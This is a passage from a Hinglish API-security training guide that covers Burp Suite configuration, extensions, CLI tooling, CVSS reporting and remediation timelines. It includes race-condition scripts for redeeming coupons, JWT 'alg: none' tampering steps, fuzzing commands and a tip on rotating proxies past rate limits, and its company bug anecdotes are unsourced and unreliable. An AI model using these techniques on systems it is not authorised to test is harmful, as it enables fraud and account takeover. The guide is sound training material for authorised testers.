+| Highlight | Request colored in history | Color nahi badla |
+| Intercept rule | Response intercept hota hai | Rule ignore ho raha |
+
+### 9. ⚖️ Comparison (X vs Y)
+
+| Feature | With Scope | Without Scope |
+|--------|------------|---------------|
+| Traffic clutter | Sirf target | Sari traffic |
+| Performance | Fast | Slow ho sakta hai |
+| Focus | High | Low |
+
+| Intercept Rule | Manual Intercept | Rule-based |
+|----------------|------------------|------------|
+| Control | Har request rokta hai | Sirf matched requests |
+| Time | Wasted | Efficient |
+
+### 10. 🚫 Common Mistakes (Beginner Traps)
+- **Mistake:** Scope mein sirf domain daala, but subdomains nahi.  
+  **Fix:** Use wildcard `*.target.com` ya saare subdomains manually add karo.
+- **Mistake:** Filter bar mein "Show only in-scope items" tick karna bhool jana.  
+  **Fix:** Hamesha filter check karo after setting scope.
+- **Mistake:** Intercept rule mein regex galat likhna.  
+  **Fix:** Simple "Contains" use karo, ya Burp help mein regex syntax check karo.
+- **Mistake:** Color coding temporary hai (session end pe reset).  
+  **Fix:** Important requests ko "Add to scope" bhi karo taako Project file mein save rahe.
+
+### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
+**Q:** "Scope set karne ke baad bhi kuch external requests kyun dikhti hain?"  
+**A:** Agar target page par external resources (CDN, analytics) hain, toh wo bhi show honge. Unhe filter karne ke liye "Filter by MIME type" use karo (e.g., hide CSS/JS).
+
+**Q:** "Intercept rule kaise pata chalega ki kaam kar raha hai?"  
+**A:** Ek test request bhejo jo intentionally trigger kare (jaise login form). Agar rule trigger hota hai toh Burp intercept karega. Nahi toh rule list mein rule enabled hai ya nahi check karo.
+
+**Q:** "Highlight ka permanent kaise karein?"  
+**A:** Burp project file (.burp) save karo. Next time load karne par highlight preserve rahega.
+
+### 12. 🌍 Real-World Use Case
+Ek bug bounty hunter ne **Spotify** target kiya. Usne scope set kiya `api.spotify.com` aur `*.spotify.com`. Phir usne response intercept rule lagaya "access_token" ke liye. Testing ke dauran usne ek response intercept kiya jisme access token leak ho raha tha, jisse wo user account hijack kar sakta tha. Scope aur rule ne time bachaya aur critical bug find karne mein madad ki.
+
+### 13. 🎨 Visual Diagram (ASCII Art)
+```
+[Browser] --> [Burp Proxy] --> [Target API]
+                 |
+                 | Scope Filter
+                 v
+         [HTTP History]
+                 |
+                 | Highlight + Intercept Rules
+                 v
+         [Analyst Focus]
+```
+
+### 14. 🛠️ Best Practices (Pro Tips)
+- **Scope mein** `^https?://.*\.target\.com` regex use karo (if supported).
+- **Color code scheme** banao: Red = Critical (auth bypass), Yellow = Suspicious (IDOR), Green = GraphQL, etc.
+- **Intercept rules** temporary hain – unhe disable karna mat bhulo jab kaam khatam ho, warna baad mein confusion hogi.
+- **Project file** save karo regularly – saara scope, highlight, rules save ho jayenge.
+
+### 15. ❓ FAQ (Interview Questions)
+**Q1: Burp Suite mein scope set karne ka kya fayda hai?**  
+A: Traffic clutter kam hota hai, performance better hoti hai, aur focus sirf target par rehta hai.
+
+**Q2: Response intercept rule kaise banayenge ki jab response mein "error" aaye toh intercept ho?**  
+A: Proxy → Options → Response interception rules → Add rule: Match type "Response body", Condition "Contains", Pattern "error". Enable karo.
+
+**Q3: Highlight ka use kyun karte hain?**  
+A: Important requests ko visually mark karne ke liye, taaki baad mein quickly access kar sako.
+
+**Q4: Scope mein wildcard kaise use karte hain?**  
+A: `*.target.com` se saare subdomains cover ho jayenge. Port bhi specify kar sakte ho: `*.target.com:80`.
+
+### 16. 📝 Ek Line Mein Yaad Rakhne Ko
+"Scope se clutter hatana, color se focus banana, rules se automation – Burp mastery ka yahi formula."
+
+---
+
+## Topic 9.2: Burp Extensions (Must-Haves)
+
+### 1. 🎯 Title
+Burp Extensions – Must-Have Tools for API Hacking
+
+### 2. 🐣 Samjhane ke liye (Analogy)
+Tum ek **mechanic** ho jiske paas basic tools hain (screwdriver, plier). Lekin agar tum complex car engine ki wiring check karna chahte ho, toh tumhe **specialized tools** chahiye – multimeter, oscilloscope, diagnostic scanner.
+
+Burp extensions wahi hain – specialized tools jo specific vulnerabilities dhoondhne mein madad karte hain. Jaise **Autorize** ek automatic tester hai jo check karta hai ki kya low-privilege user high-privilege kaam kar sakta hai (BOLA detection). **Turbo Intruder** ek high-speed brute-forcer hai jo race conditions find karta hai.
+
+### 3. 📖 Technical Definition
+Burp Extensions third-party plugins hain jo Burp Suite ki functionality extend karte hain. BApp Store se install kiye ja sakte hain. API hacking ke liye kuch extensions almost mandatory hain:
+- **Autorize:** Authorization bypass testing (BOLA/IDOR).
+- **AuthMatrix:** Role-based access control matrix testing.
+- **JSON Web Tokens:** JWT manipulation.
+- **GraphQL Raider / InQL:** GraphQL endpoint testing.
+- **Turbo Intruder:** High-performance brute force, race conditions.
+- **Backslash Powered Scanner:** Advanced parameter parsing for weird injection points.
+- **Logger++:** Enhanced logging with filtering and search.
+
+### 4. 🧠 Zaroorat Kyun Hai?
+Manual testing slow hai aur kuch attacks (race conditions, massive parameter fuzzing) manually possible nahi. Extensions automate repetitive tasks, naye attack surfaces kholte hain, aur depth badhate hain.
+
+### 5. 🔍 Visual - Screen Par Kya Dikhega
+**BApp Store:** Burp mein **Extender** tab → **BApp Store** – yahan extensions list dikhti hai, install button hota hai.
+
+**Autorize:** Ek alag tab aata hai "Autorize". Usme cookies set karte hain aur run button se test chalta hai. Results table mein show hote hain: "Is access allowed?" Yes/No.
+
+**Turbo Intruder:** Intruder ki tarah, lekin Python script likhni padti hai. Ek editor window khulti hai jahan script likho aur run karo.
+
+### 6. ⚙️ Under the Hood
+- **Autorize:** Low-privilege user ke session cookies store karta hai. Phir high-privilege endpoints ki requests automatically baja kar check karta hai ki response 200 aata hai ya 403. Agar 200 aaya, toh BOLA vulnerability.
+- **Turbo Intruder:** Python mein asyncio use karta hai multiple connections simultaneously bhejne ke liye, taaki race conditions trigger ho saken.
+- **JSON Web Tokens:** JWT intercept karte hi decode kar deta hai aur modify karne ka option deta hai (signature bypass attacks ke liye).
+
+### 7. 💻 Hands-On Step-by-Step (Key Extensions ka setup & use)
+
+#### A) Autorize
+1. **Install:** Extender → BApp Store → Search "Autorize" → Install.
+2. **Configure:**
+   - Low-privilege user ke cookies copy karo.
+   - Autorize tab mein "Cookies" field mein paste karo.
+   - "Check" button se test karo ki cookies valid hain.
+3. **Test:**
+   - High-privilege endpoints ki requests ko Autorize ke "Request list" mein add karo (ya burp history se send karo).
+   - "Run" click karo.
+4. **Results:**
+   - Agar response status 200 aaya, toh vulnerability (BOLA).
+   - Response 403/401 aaya toh protected.
+5. **Success:** Red color mein "Bypassed" dikhega.
+   **Failure:** Green color "Enforced" dikhega.
+
+#### B) JSON Web Tokens
+1. Install from BApp Store.
+2. Jab bhi koi JWT request intercept karo, extension automatically pop-up karega.
+3. Modify karo: `alg` change to `none`, kid/payload tamper karo.
+4. Send modified request.
+5. **Success:** Server accepts (200 OK).
+   **Failure:** 401 Unauthorized.
+
+#### C) Turbo Intruder
+1. Install.
+2. Kisi request par right-click → "Send to Turbo Intruder".
+3. Python script editor open hoga. Sample script already hai.
+4. Script mein wordlist, thread count adjust karo.
+5. Click "Attack".
+6. **Success:** Rapid requests bhejega, results tab mein dikhenge.
+   - Race condition ke liye script mein `engine.queue` with same request multiple times.
+
+#### D) GraphQL Raider / InQL
+1. Install InQL (ya GraphQL Raider).
+2. GraphQL endpoint URL daalo (e.g., `https://target.com/graphql`).
+3. Click "Introspection" to fetch schema.
+4. Schema browse karo, queries generate karo, send karo.
+5. **Success:** Schema mil gaya, queries run hui.
+
+### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
+
+| Extension | Success | Failure |
+|-----------|---------|---------|
+| Autorize | Bypass (200 OK) for unauthorized endpoint | Access denied (403) |
+| JWT | JWT modified request accepted | Rejected |
+| Turbo Intruder | Race condition duplicate action | No duplicate |
+| InQL | Introspection data returned | Introspection disabled |
+
+### 9. ⚖️ Comparison (X vs Y)
+
+| Extension | Use Case | Alternative |
+|-----------|----------|-------------|
+| Autorize | BOLA detection | Manual cookie swap |
+| AuthMatrix | Complex RBAC | Manual role testing |
+| JWT | JWT attacks | Manual JWT decoding + Repeater |
+| Turbo Intruder | Race conditions / Rate limit bypass | Intruder (slow) |
+| InQL | GraphQL testing | Postman manual queries |
+
+### 10. 🚫 Common Mistakes (Beginner Traps)
+- **Mistake:** Autorize mein sirf cookies dalna, but CSRF tokens ignore karna.  
+  **Fix:** Agar app CSRF tokens use karti hai, toh Autorize mein additional headers add karo ya session token use karo.
+- **Mistake:** Turbo Intruder mein default script use karna without understanding.  
+  **Fix:** Python script ko customize karo: queue size, pause, etc.
+- **Mistake:** JWT extension se `alg: none` bhejna but signature remove karna bhool jana.  
+  **Fix:** Signature part bhi hatao (last dot ke baad ka part).
+- **Mistake:** InQL se introspection fail hone par maan lena ki GraphQL nahi hai.  
+  **Fix:** Manual queries try karo (e.g., `{__typename}`) – introspection often disabled but GraphQL exists.
+
+### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
+**Q:** "Autorize ko kaise pata chalega ki kaunse endpoints high-privilege hain?"  
+**A:** Tum manually history mein se endpoints select karo jo high-privilege users ke liye hain. Autorize unhe low-privilege cookies ke saath request karega.
+
+**Q:** "Turbo Intruder mein race condition ke liye script kaise likhein?"  
+**A:** Bas same request multiple times queue karo bina delay ke. Example:
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=30,
+                           requestsPerConnection=100,
+                           pipeline=False)
+    for i in range(100):
+        engine.queue(target.req)
+```
+
+**Q:** "GraphQL Raider aur InQL mein kya farak hai?"  
+**A:** InQL PortSwigger official hai, stable hai. GraphQL Raider bhi kaam karta hai. Dono kaam ek jaise hain.
+
+### 12. 🌍 Real-World Use Case
+**Facebook Bug Bounty** mein ek researcher ne **Autorize** use kiya. Usne ek endpoint `/api/admin/users` discover kiya. Low-privilege user ke cookies ke saath Autorize run kiya toh response 200 aaya, jisse wo saare users ka data le sakta tha. Facebook ne critical BOLA fix kiya.
+
+**Tesla** mein **Turbo Intruder** se race condition find hui: ek hi coupon code multiple times redeem kar sakte the.
+
+### 13. 🎨 Visual Diagram (ASCII Art)
+```
+[Burp Extender] --> [BApp Store] --> [Install Extension]
+                           |
+                           v
+               [New Tab in Burp UI]
+                           |
+                           v
+              [Automated Testing]
+```
+
+### 14. 🛠️ Best Practices (Pro Tips)
+- **Autorize:** Low-privilege user ke saath saath completely unauthenticated requests bhi check karo (cookies hata ke).
+- **Turbo Intruder:** Race condition ke liye `concurrentConnections` high rakho (30-50) aur `requestsPerConnection` 1 rakho.
+- **JWT extension:** Signature bypass ke baad bhi JWT valid ho sakta hai – hamesha check karo.
+- **Logger++:** Saari traffic log karo with filters – baad mein analysis easy.
+- **Backslash Powered Scanner:** Use karo jab normal intruder fuzzing se hidden parameters na mile.
+
+### 15. ❓ FAQ (Interview Questions)
+**Q1: Autorize extension kaise kaam karta hai?**  
+A: Low-privilege user ke cookies ke saath high-privilege endpoints ki requests automatically bhejta hai aur response compare karta hai.
+
+**Q2: Turbo Intruder aur normal Intruder mein kya difference hai?**  
+A: Turbo Intruder Python scriptable hai aur multi-threaded asynchronous requests bhej sakta hai, jisse race conditions test kar sakte hain. Normal Intruder slow hai.
+
+**Q3: JWT extension se kaunsa attack possible hai?**  
+A: Algorithm confusion (change alg to HS256 with known public key), `kid` injection, `none` algorithm, etc.
+
+**Q4: InQL se introspection block hone par GraphQL kaise test karein?**  
+A: Manual queries (e.g., `{__typename}`) se pata karo ki endpoint exist karta hai. Phir common field names fuzz karo.
+
+**Q5: Backslash Powered Scanner kya karta hai?**  
+A: Advanced parameter parsing – yeh common injection points dhoondhta hai jo normal scanners miss kar dete hain (jaise JSON keys, XML attributes).
+
+### 16. 📝 Ek Line Mein Yaad Rakhne Ko
+"Har vulnerability ke liye ek extension, aur har extension ke liye ek use case – Burp extensions hi asli superpower hain."
+
+---
+
+## Topic 9.3: CLI & Scripting
+
+### 1. 🎯 Title
+CLI & Scripting – Postman, Python, Nuclei, Ffuf se Automation
+
+### 2. 🐣 Samjhane ke liye (Analogy)
+Maano tum ek **command center** mein ho jahan se multiple operations ek saath chala rahe ho. Tumhare paas alag alag **specialized teams** hain:
+- **Postman/Newman** – Ek team jo pre-written testcases baar baar chala kar regression karti hai.
+- **Python Scripts** – Ek R&D team jo custom complex attacks ke liye scripts likhti hai.
+- **Nuclei** – Ek security scanner team jo known vulnerabilities ke liye templates chala kar report banati hai.
+- **Ffuf/Gobuster** – Ek reconnaissance team jo hidden paths aur files dhoondhti hai.
+
+CLI (Command Line Interface) in teams ko ek saath command se run karne ka tareeka hai.
+
+### 3. 📖 Technical Definition
+CLI tools aur scripting automate API testing ke liye essential hain:
+- **Postman/Newman:** Postman collections ko command line se run karne ke liye (CI/CD mein integrate kar sakte ho).
+- **Python Requests:** Python library jo HTTP requests bhejne ke liye use hoti hai. Complex logic, loops, aur conditions implement karne ke liye.
+- **Nuclei:** Go-based vulnerability scanner jo templates use karta hai specific CVEs aur misconfigurations detect karne ke liye.
+- **Ffuf/Gobuster:** Directory/file brute-forcing tools, API route discovery ke liye.
+
+### 4. 🧠 Zaroorat Kyun Hai?
+- **Speed:** Automation manual testing se 100x fast hai.
+- **Repeatability:** Ek baar script likh kar baar baar use kar sakte ho.
+- **CI/CD Integration:** Regression testing pipeline mein daal sakte ho.
+- **Complex attacks:** Race conditions, custom payload generation – scripting se possible.
+
+### 5. 🔍 Visual - Screen Par Kya Dikhega
+
+**Postman:** GUI mein collection banate ho. Phir CLI mein `newman run collection.json` run karte ho – terminal mein progress aur results dikhte hain.
+
+**Python Script:** Ek text editor (VS Code) mein `script.py` likho. Terminal mein `python script.py` run karo – responses print hote hain.
+
+**Nuclei:** Terminal mein `nuclei -u https://api.target.com -t ~/nuclei-templates/api/` run karo – findings list hoti hain.
+
+**Ffuf:** Terminal mein `ffuf -u https://api.target.com/FUZZ -w wordlist.txt -fc 404` – status codes ke saath results.
+
+### 6. ⚙️ Under the Hood
+- **Newman:** Postman collection JSON file ko parse karta hai, har request ko execute karta hai, assertions check karta hai, aur report generate karta hai.
+- **Python Requests:** `requests` library send karta hai HTTP/1.1 requests, handles sessions, cookies, headers.
+- **Nuclei:** YAML templates mein defined matchers (regex, status code, word) ke basis pe response check karta hai.
+- **Ffuf:** Multi-threaded HTTP fuzzer, wordlist ke har entry ko `FUZZ` keyword se replace karta hai aur response compare karta hai.
+
+### 7. 💻 Hands-On Step-by-Step
+
+#### A) Postman / Newman
+1. Postman mein API requests ka collection banao (e.g., login, get user, update user).
+2. Export collection as JSON (`collection.json`).
+3. Environment banao (e.g., `env.json` with base URL, tokens).
+4. CLI mein install newman: `npm install -g newman`.
+5. Run: `newman run collection.json -e env.json --reporters cli,json --reporter-json-export output.json`.
+6. **Success:** Sab tests pass huye, terminal mein "✔" dikhega.
+   **Failure:** Koi test fail hua, terminal mein "✘" dikhega.
+
+#### B) Python Requests (Race Condition Example)
+```python
+import requests
+import threading
+
+url = "https://api.target.com/coupon/redeem"
+data = {"code": "DISCOUNT10"}
+cookies = {"session": "valid_session"}
+
+def attack():
+    r = requests.post(url, json=data, cookies=cookies)
+    print(r.status_code)
+
+threads = []
+for i in range(50):
+    t = threading.Thread(target=attack)
+    t.start()
+    threads.append(t)
+
+for t in threads:
+    t.join()
+```
+Run karo: `python race.py`. Multiple 200 OK responses dekho – duplicate redeem possible hai.
+
+#### C) Nuclei
+1. Install nuclei: `go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest`.
+2. Download templates: `git clone https://github.com/projectdiscovery/nuclei-templates.git`.
+3. Run against API:
+   `nuclei -u https://api.target.com -t nuclei-templates/api/ -severity critical,high`
+4. **Success:** Vulnerabilities mili – output mein template name, URL, description.
+   **Failure:** No findings.
+
+#### D) Ffuf for API Route Discovery
+1. Prepare wordlist: `api_words.txt` containing common endpoints: `user`, `admin`, `v1`, `swagger`, `graphql`, etc.
+2. Run: `ffuf -u https://api.target.com/FUZZ -w api_words.txt -mc 200,403,401 -fc 404`
+3. **Success:** Response size/content mein differences – valid endpoints.
+   **Failure:** Sirf 404.
+
+### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
+
+| Tool | Success | Failure |
+|------|---------|---------|
+| Newman | All tests passed | Test failures |
+| Python | Desired output (e.g., duplicate response) | Errors / no effect |
+| Nuclei | Vulnerabilities reported | No matches |
+| Ffuf | Valid endpoints (status 200, 403) | All 404 |
+
+### 9. ⚖️ Comparison (X vs Y)
+
+| Tool | Primary Use | Complexity |
+|------|-------------|------------|
+| Postman/Newman | Regression testing | Low (GUI + CLI) |
+| Python | Custom attacks | High (programming) |
+| Nuclei | CVE scanning | Medium (templates) |
+| Ffuf | Content discovery | Low (fuzzing) |
+
+### 10. 🚫 Common Mistakes (Beginner Traps)
+- **Mistake:** Newman mein environment variables sahi se set na karna.  
+  **Fix:** `-e env.json` use karo, aur env file mein `"values"` array ho.
+- **Mistake:** Python mein threading ke saath rate limit na respect karna.  
+  **Fix:** Agar app rate limited hai, toh proxies rotate karo ya delay add karo.
+- **Mistake:** Nuclei templates outdated.  
+  **Fix:** Regularly `git pull` karo templates repo.
+- **Mistake:** Ffuf mein `-fc 404` use na karna – bahut clutter.  
+  **Fix:** Hamesha filter unwanted status codes.
+
+### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
+**Q:** "Postman collection mein dynamic values (e.g., token) kaise handle karein?"  
+**A:** Postman mein test scripts likh kar token store karo. Newman run karte waqt environment file mein variable update kar sakte ho.
+
+**Q:** "Python requests mein session cookies kaise maintain karein?"  
+**A:** `s = requests.Session()` use karo. Pehle login request bhejo, cookie automatically store ho jayegi. Baad ki requests `s.get(...)` se karo.
+
+**Q:** "Nuclei ke templates customize kaise karein?"  
+**A:** Template YAML file copy karo, apne hisaab se `matchers` aur `extractors` modify karo.
+
+**Q:** "Ffuf mein recursion kaise enable karein?"  
+**A:** `-recursion` flag use karo. Depth specify kar sakte ho `-recursion-depth`.
+
+### 12. 🌍 Real-World Use Case
+**PayPal** mein ek bug hunter ne Python script likhi jo race condition check karti thi. Usne 100 threads se ek coupon redeem kiya aur dekha ki multiple redeem ho rahe hain – critical financial bug.
+
+**Tesla** ne Nuclei templates use kare apne infrastructure mein CVE scan karne ke liye. Ek misconfigured S3 bucket mila jisse internal docs leak hue.
+
+### 13. 🎨 Visual Diagram (ASCII Art)
+```
+[Postman Collection] --> [Newman] --> [CI/CD] --> [Test Report]
+
+[Python Script] --> [Threads] --> [Race Condition] --> [Findings]
+
+[Nuclei Templates] --> [Nuclei] --> [Target API] --> [Vulnerabilities]
+
+[Wordlist] --> [Ffuf] --> [API Endpoints] --> [Manual Testing]
+```
+
+### 14. 🛠️ Best Practices (Pro Tips)
+- **Postman:** Environment files version control mein rakhna (with sensitive data hata ke). Use `{{variable}}` syntax.
+- **Python:** `argparse` use karo script mein parameters pass karne ke liye. `requests` library ka timeout set karo.
+- **Nuclei:** `-stats` flag se real-time progress dekh sakte ho. `-json` output parse karne ke liye.
+- **Ffuf:** `-ac` (auto-calibrate) use karo to filter false positives. Wordlists se specific API wordlist use karo (e.g., SecLists/Discovery/Web-Content/api).
+
+### 15. ❓ FAQ (Interview Questions)
+**Q1: Newman kya hai aur kaise use karte hain?**  
+A: Newman Postman collections ka command-line runner hai. CI/CD pipelines mein integration ke liye use karte hain.
+
+**Q2: Python mein multithreading se race condition test kaise karte hain?**  
+A: threading.Thread create karo, target function mein request bhejo, sabko start karo, join karo. Response status codes count karo.
+
+**Q3: Nuclei templates ka structure kya hota hai?**  
+A: YAML format mein id, info, requests, matchers, extractors. Example:
+```yaml
+id: example
+info:
+  name: Test
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin"
+    matchers:
+      - type: word
+        words:
+          - "admin panel"
+```
+
+**Q4: Ffuf mein kaise pata chalega ki endpoint valid hai?**  
+A: Status code 200, 403, 401 indicate exist. Response size bhi matter karta hai (different from 404 page).
+
+**Q5: Postman mein dynamic token kaise handle karte hain automation mein?**  
+A: Tests tab mein `pm.environment.set("token", pm.response.json().token)` likho. Newman environment file mein token variable use karo.
+
+### 16. 📝 Ek Line Mein Yaad Rakhne Ko
+"CLI aur scripting se automation, nahi toh manual testing se depression."
+
+---
+
+## Topic 9.4: Reporting (CVSS & PoC)
+
+### 1. 🎯 Title
+Reporting – CVSS Scoring aur PoC Writing
+
+### 2. 🐣 Samjhane ke liye (Analogy)
+Maano tumne ek **doctor** ko patient ki bimari batani hai. Tum sirf "patient ko bukhar hai" bologe toh doctor itna seriously nahi lega. Lekin agar tum batao "patient ko 105°F bukhar hai, 3 din se, cough bhi hai, X-ray mein pneumonia dikh raha" – toh doctor turant action lega.
+
+**CVSS score** – bukhar ki severity batane ka ek standard scale (jaise 105°F critical hai). **PoC (Proof of Concept)** – X-ray report ki tarah hai jo clearly dikhati hai ki bimari kaise lagti hai.
+
+### 3. 📖 Technical Definition
+- **CVSS (Common Vulnerability Scoring System):** Vulnerability ki severity numeric score mein batane ka industry standard. Base Score 0-10 hota hai. Components: Attack Vector (Network/Local), Attack Complexity, Privileges Required, User Interaction, Scope, Confidentiality/Integrity/Availability Impact.
+- **PoC (Proof of Concept):** Step-by-step reproducible exploit demonstration, usually screenshots aur curl commands ke saath.
+- **Remediation Guidance:** Vulnerability ko fix karne ke liye framework-specific suggestions.
+
+### 4. 🧠 Zaroorat Kyun Hai?
+- **CVSS:** Team ko priority samajh aati hai – critical vulnerabilities pehle fix hongi.
+- **PoC:** Developer ko exactly samajh aata hai ki kya galat hai aur kaise reproduce karein.
+- **Remediation:** Developer ko fix ka idea milta hai (e.g., "Spring Boot mein @PreAuthorize use karo").
+
+### 5. 🔍 Visual - Screen Par Kya Dikhega
+**CVSS Calculator:** Browser mein `first.org/cvss/calculator` open karo. Different parameters select karte ho aur final score dikhta hai.
+
+**PoC:** Ek text document ya PDF, jisme headings hain: Steps to Reproduce, Screenshots, Impact, Suggested Fix.
+
+### 6. ⚙️ Under the Hood
+- CVSS v3.1 formula: Base Score = Impact Sub-Score + Exploitability Sub-Score, capped at 10.
+- PoC mein screenshots ya terminal output dalna zaroori hai.
+- Remediation: Language/framework specific recommendations.
+
+### 7. 💻 Hands-On Step-by-Step
+
+#### A) CVSS Score Calculate Karna
+1. Open `https://www.first.org/cvss/calculator/`.
+2. Vulnerability ke according parameters select karo:
+   - **Attack Vector (AV):** Network (remote exploit) ya Local (requires access).
+   - **Attack Complexity (AC):** Low (no special conditions) ya High (requires extra steps).
+   - **Privileges Required (PR):** None, Low, High.
+   - **User Interaction (UI):** None (automatic) ya Required (user click).
+   - **Scope (S):** Unchanged (only component affected) ya Changed (other components affected).
+   - **Confidentiality/Integrity/Availability (C/I/A):** None, Low, High.
+3. Calculator automatically score dega (e.g., 9.8 Critical).
+4. Use score in report.
+
+#### B) PoC Writing
+1. **Title:** Clear vulnerability name (e.g., "IDOR in /api/user/{id}").
+2. **Description:** Short summary.
+3. **Steps to Reproduce:**
+   - Step 1: Login as user A, get session cookie.
+   - Step 2: Send request to `GET /api/user/123` with cookie.
+   - Step 3: Observe response contains user B's data.
+4. **Screenshots:**
+   - Burp request/response ka screenshot.
+   - Highlight sensitive data.
+5. **Impact:** What attacker can do (e.g., view all users' data).
+6. **Suggested Fix:** Input validation, authorization check, etc.
+
+#### C) Remediation Guidance
+- For broken access control: "Implement server-side authorization checks using middleware (e.g., Express.js `authMiddleware`)."
+- For SQLi: "Use parameterized queries (e.g., Spring Boot `@Query` with `?1`)."
+
+### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
+
+| Part | Success | Failure |
+|------|---------|---------|
+| CVSS score | Correct score based on parameters | Wrong score (over/under estimate) |
+| PoC | Developer reproduce kar paya | Steps unclear, screenshot missing |
+| Remediation | Fix implemented | Suggested fix wrong/not applicable |
+
+### 9. ⚖️ Comparison (X vs Y)
+
+| Severity | CVSS Score Range | Example |
+|----------|------------------|---------|
+| Critical | 9.0-10.0 | RCE, SQLi with data leak |
+| High | 7.0-8.9 | IDOR leading to privilege escalation |
+| Medium | 4.0-6.9 | CSRF, XSS (stored) |
+| Low | 0.1-3.9 | Information disclosure (non-sensitive) |
+
+| Reporting Type | PoC | Remediation |
+|----------------|-----|-------------|
+| Purpose | Show exploitability | Show fix approach |
+| Audience | Developers, managers | Developers |
+
+### 10. 🚫 Common Mistakes (Beginner Traps)
+- **Mistake:** CVSS parameters galat select karna (e.g., Privileges Required = None jab actual mein authenticated hai).  
+  **Fix:** Honest analysis karo, overestimate mat karo.
+- **Mistake:** PoC mein screenshots nahi hai, sirf text.  
+  **Fix:** Hamesha screenshot lo aur highlight karo.
+- **Mistake:** Remediation mein generic suggestion ("input validation").  
+  **Fix:** Framework-specific code snippet do.
+- **Mistake:** Impact ko overstate karna (e.g., "full server compromise" jab sirf data read ho raha ho).  
+  **Fix:** Real impact batao.
+
+### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
+**Q:** "CVSS score mein Scope ka kya matlab hai?"  
+**A:** Scope (S) batata hai ki vulnerability ka impact sirf us component tak limited hai ya doosre components bhi affect hote hain. Example: SQLi se database read ho raha hai (same component) – Scope Unchanged. RCE se server par complete control aur us server se internal network access – Scope Changed.
+
+**Q:** "PoC mein screenshot kaise lo taaki clean lage?"  
+**A:** Burp mein request/response par right-click → "Copy as curl command" bhi useful hai. Screenshot ke saath relevant parts circle karo.
+
+**Q:** "Remediation mein kabhi kabhi developer ka framework nahi pata, toh kya likhein?"  
+**A:** Generic recommendation do ("Use parameterized queries") aur note karo ki specific framework ke hisaab se implement karein.
+
+### 12. 🌍 Real-World Use Case
+**Google Vulnerability Reward Program** mein ek researcher ne IDOR report kiya. Usne CVSS score 7.5 (High) diya. PoC mein step-by-step screenshots the aur curl commands. Remediation mein bola ki "Check user authorization using `@PreAuthorize` in Spring Boot". Google ne within 3 days fix kiya.
+
+### 13. 🎨 Visual Diagram (ASCII Art)
+```
+[Vulnerability Discovery] --> [CVSS Scoring] --> [PoC Documentation]
+                               |
+                               v
+                        [Remediation Guidance]
+                               |
+                               v
+                        [Final Report PDF]
+```
+
+### 14. 🛠️ Best Practices (Pro Tips)
+- **CVSS:** Official calculator use karo, manually mat nikalo. Parameters ka description padh lo.
+- **PoC:** Steps ko atomic rakho (har step ek command ya click). Screenshot mein timestamps mat dikhao (distraction).
+- **Remediation:** OWASP cheat sheets refer karo. "Fix: Use `bcrypt` for password hashing" jaise specific.
+- **Report template:** Maintain a standard template with sections: Summary, CVSS, PoC, Impact, Remediation.
+
+### 15. ❓ FAQ (Interview Questions)
+**Q1: CVSS score kaise calculate karte hain?**  
+A: first.org/cvss/calculator par jao, vulnerability ke hisaab se AV, AC, PR, UI, S, C, I, A select karo.
+
+**Q2: PoC mein kya kya hona chahiye?**  
+A: Steps to reproduce, screenshots, impact, suggested fix.
+
+**Q3: Agar vulnerability ka impact sirf low hai, toh CVSS score kya hoga?**  
+A: Approximately 3-4 (Low). Lekin agar easily exploitable hai, toh Medium bhi ho sakta hai.
+
+**Q4: Remediation timeline kya hota hai?**  
+A: Industry standards ke hisaab se Critical 7 days, High 30 days, Medium 90 days, Low best effort.
+
+**Q5: CVSS score mein "Attack Complexity High" ka kya matlab hai?**  
+A: Exploit ke liye special conditions chahiye (e.g., timing, specific configuration). Toh score kam ho jayega.
+
+### 16. 📝 Ek Line Mein Yaad Rakhne Ko
+"CVSS se severity batao, PoC se reproduce karwao, remediation se fix karwao – yeh hai professional reporting ka trika."
+
+---
+
+## Topic 9.5: Remediation Timelines (Industry Standards)
+
+### 1. 🎯 Title
+Remediation Timelines – Critical, High, Medium, Low ke Fix Deadlines
+
+### 2. 🐣 Samjhane ke liye (Analogy)
+Tum ek **building supervisor** ho. Building mein alag alag problems hain:
+- **Critical (P1):** Lift ka cable tootne wala hai – turant band karo, 7 din mein fix.
+- **High (P2):** Fire alarm kaam nahi kar raha – 30 din mein fix karo.
+- **Medium (P3):** Parking ki light kharab – 90 din mein fix.
+- **Low (P4):** Lobby mein paint utar raha – jab time mile tab karo.
+
+Yahi hota hai vulnerability remediation timelines.
+
+### 3. 📖 Technical Definition
+Remediation timelines industry standards hain jo define karte hain ki kitne din mein vulnerability fix karni chahiye, based on severity:
+- **Critical (P1):** Fix within 7 days – RCE, Authentication Bypass, BOLA leading to data breach.
+- **High (P2):** Fix within 30 days – SQLi (non-critical), Stored XSS, Broken Access Control.
+- **Medium (P3):** Fix within 90 days – CSRF, Information Disclosure (non-sensitive), Misconfigurations.
+- **Low (P4):** Best effort, next release cycle – Missing security headers, verbose error messages.
+
+### 4. 🧠 Zaroorat Kyun Hai?
+- Clients/companies ko pata hona chahiye ki kis vulnerability ko pehle fix karna hai.
+- Compliance aur SLA maintain karne ke liye.
+- Security team ko prioritization mein madad.
+
+### 5. 🔍 Visual - Screen Par Kya Dikhega
+Report mein ek table hoga:
+| Severity | CVSS Score | Time to Fix | Examples |
+|----------|------------|-------------|----------|
+| Critical | 9.0-10.0 | 7 days | RCE, Auth Bypass |
+| High | 7.0-8.9 | 30 days | IDOR, Stored XSS |
+| Medium | 4.0-6.9 | 90 days | CSRF, Misconfig |
+| Low | 0-3.9 | Best effort | Header missing |
+
+### 6. ⚙️ Under the Hood
+- Standards derived from PCI-DSS, ISO 27001, bug bounty platforms (HackerOne, Bugcrowd).
+- Timelines assume fix with testing and deployment.
+- Exception cases: Critical fix within 24-48 hours for actively exploited bugs.
+
+### 7. 💻 Hands-On Step-by-Step (Report mein kaise include karein)
+
+1. Vulnerability ko CVSS score do (e.g., 9.8).
+2. Severity determine karo: 9.8 → Critical.
+3. Recommendation section mein timeline likho:
